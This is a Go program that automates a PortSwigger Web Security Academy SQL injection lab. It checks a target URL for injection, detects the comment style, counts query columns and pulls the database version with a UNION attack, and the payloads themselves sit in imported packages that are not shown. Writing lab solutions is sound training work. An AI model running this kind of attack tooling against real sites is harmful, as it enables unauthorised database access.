package main

// lab url: https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks/lab-retrieve-data-from-other-tables#

import (
	"fmt"
	"os"
	"strings"

	"github.io/kinasr/pen_payloads/PortSwiggerLabs/SQLi/lab_7/logger"
	"github.io/kinasr/pen_payloads/PortSwiggerLabs/SQLi/lab_7/sqli"
	"github.io/kinasr/pen_payloads/PortSwiggerLabs/SQLi/lab_7/utility"
	"github.io/kinasr/pen_payloads/PortSwiggerLabs/SQLi/lab_7/constant"
)


func main() {
	logger.Action("Starting SQL Injection Lab 7...")

	// Parse command-line arguments for configuration
	// This will include the target URL, proxy URL, and log level
	logger.Debug("Parsing command-line arguments for configuration...")
	config, err := utility.ParseArgs()
	if err != nil {
		// parseArgs already prints usage info on error
		logger.Fatalf("Exiting due to error in command-line arguments: %w", err.Error())
		os.Exit(1)
	}

	// Set log level based on command-line argument
	logger.SetLogLevelS(config.LogLevel)
	logger.Debugf("Log level set to: %s", config.LogLevel)

	// Validate the lab URL
	targetURL := utility.NormalizeURL(config.LabURL) + constant.URI_PATH
	if !strings.HasSuffix(targetURL, constant.URI_PATH) {
		targetURL = fmt.Sprintf("%s%s", targetURL, constant.URI_PATH)
	}
	logger.Infof("Target URL after normalization: %s", targetURL)
 
	// Create HTTP client with optional proxy
	logger.Debugf("Creating HTTP client with proxy URL: %s", config.ProxyURL)
	client, err := utility.NewClient(config.ProxyURL)
	if err != nil {
		logger.Fatalf("Failed to create HTTP client: %s", err.Error())
		os.Exit(1)
	}

	// Check if the target URL is vulnerable to SQL injection
	logger.Action("Checking if target URL is vulnerable to SQL injection")
	isVulnerable, err := sqli.DoesVulnerabilityExist(client, targetURL)
	if err != nil {
		logger.Fatalf("Error checking vulnerability: %s", err.Error())
		os.Exit(1)
	}
	if !isVulnerable {
		logger.Fatal("The target URL does not appear to be vulnerable to SQL injection.")
		os.Exit(1)
	}
	logger.Successf("Target URL is vulnerable to SQL injection: %s", targetURL)

	// Find the comment style used by the application
	logger.Action("Finding comment style for target URL")
	commentStyle, err := sqli.FindCommentStyle(client, targetURL)
	if err != nil {
		logger.Fatalf("Error finding comment style: %s", err.Error())
		os.Exit(1)
	}
	logger.Successf("Comment style detected: %s", commentStyle)

	// Find the number of columns in the vulnerable query result set
	logger.Action("Finding number of columns in the vulnerable query result set")
	numberOfColumns, err := sqli.FindNumOfColumns(client, targetURL, commentStyle)
	if err != nil {
		logger.Fatalf("Error finding number of columns: %s", err.Error())
		os.Exit(1)
	}
	logger.Successf("Number of columns detected: %d", numberOfColumns)

	// Retrieve the database version using the UNION SELECT technique
	logger.Action("Retrieving database version")
	dbVersion, err := sqli.GetDatabaseVersion(client, targetURL, commentStyle, numberOfColumns)
	if err != nil {
		logger.Fatalf("Error retrieving database version: %s", err.Error())
		os.Exit(1)
	}
	logger.Successf("Database version: %s", dbVersion)
}

